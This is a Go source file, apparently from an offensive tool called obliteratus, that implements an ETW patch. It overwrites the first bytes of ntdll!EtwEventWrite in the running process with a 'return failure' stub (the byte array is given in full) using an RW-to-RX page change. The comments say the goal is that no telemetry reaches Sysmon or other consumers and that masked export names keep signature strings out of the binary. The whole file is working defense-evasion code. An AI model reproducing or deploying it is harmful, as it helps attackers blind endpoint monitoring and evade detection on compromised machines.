//go:build windows

package research

import (
	"errors"
	"fmt"

	"github.com/DevCop95/obliteratus/internal/winname"
)

// etwPatch is the classic telemetry neuter: `mov eax, 0xC0000001; ret`
// (STATUS_NOT_FOUND — benign failure), written over the first bytes of
// ntdll!EtwEventWrite in THIS process only. It takes no parameters and
// returns failure, so every ETW event the tool would otherwise emit simply
// never reaches a consumer (Sysmon included).
var etwPatch = []byte{0xB8, 0x01, 0x00, 0x00, 0xC0, 0xC3}

// procEtwPatch is resolved from the masked ntdll handle in dll_windows.go;
// the export name is masked too (names_windows.go), so the signature string is
// absent from the static binary.
var procEtwPatch = ntdll.NewProc(winname.EtwWrite)

// PatchETW neuters ntdll!EtwEventWrite in the current process via an RW → write
// → RX transition (W^X). It returns the patched runtime address for the
// operator log, or an error when the patch is already applied or the page
// cannot be changed.
func PatchETW() (uintptr, error) {
	addr, err := patchPrologue(procEtwPatch, etwPatch)
	if errors.Is(err, errAlreadyPatched) {
		return 0, fmt.Errorf("etw: %s: %w", winname.EtwWrite, errAlreadyPatched)
	}
	if err != nil {
		return 0, fmt.Errorf("etw: %w", err)
	}
	return addr, nil
}
